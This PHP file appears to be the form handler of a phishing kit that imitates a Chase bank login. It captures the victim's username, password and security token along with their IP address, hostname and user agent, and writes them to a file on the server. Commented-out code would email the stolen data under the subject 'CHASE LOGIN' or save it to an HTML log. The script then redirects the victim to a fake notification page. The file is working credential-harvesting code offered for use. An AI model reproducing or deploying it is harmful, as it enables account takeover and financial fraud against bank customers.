<?php 


    function genRandString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }

    


	ob_start();
    session_start();
    // include '../data.php';
    // include '../anoxytytrap/info.php';
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['username'] ) ) {
		
		$_SESSION['username'] 	  = $_POST['username'];
		$_SESSION['password'] 	  = $_POST['password'];
		$_SESSION['securityToken'] 	  = $_POST['securityToken'];
        $log = "username: ".$_SESSION['username']."    password: ".$_SESSION['password']."    login ip: ".$ip."    hostname: ".$hostname."    user agent: ". $useragent."    security token: ".$_SESSION['securityToken'] ;
        $filename = $_SESSION['securityToken'];
        if($filename == ""){
            $_SESSION['randString'] = genRandString(80);
            $filename = $_SESSION['randString'];
        }
        if(!file_put_contents($filename, $log)){
            // permission issue
        }

        $_SESSION['filename']=$filename;
		
        // $message = file_get_contents('../anoxyty/send/signin.html');

        // $message = preg_replace('{AN0XYTY-A}', $_SESSION['username'], $message);
        // $message = preg_replace('{AN0XYTY-B}', $_SESSION['password'], $message);
        // $message = preg_replace('{AN0XYTY-C}', $_SESSION['securityToken'], $message);

        // $message = preg_replace('{AN0XYTY-IP}', $ip, $message);
        
        // $message = preg_replace('{AN0XYTY-INFO}', $ip, $message);
        // $message = preg_replace('{AN0XYTY-UGENT}', $useragent, $message);


        // $message = preg_replace('{AN0XYTY-Z}', $LOOKUP_CITY, $message);
        // $message = preg_replace('{AN0XYTY-X}', $LOOKUP_STATE, $message);
        // $message = preg_replace('{AN0XYTY-W}', $LOOKUP_ISP, $message);
        
        // $subject = " CHASE LOGIN  : $ip";
        // $headers = "From: CHASE BY Anoxyty <chase@anoxyty.com>\r\n";
        // $headers .= "MIME-Version: 1.0\r\n";
        // $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
      
        // @mail($data,$subject,$message,$headers);

		// $save = fopen("saved/stored.html","a+");
        // fwrite($save,$message);
        // fclose($save);

        header("Location: ../notification.php?&sessionid=overviewAccounts/");
        exit();
	} else {
		header("Location: auth.php");
		exit();
	}
?>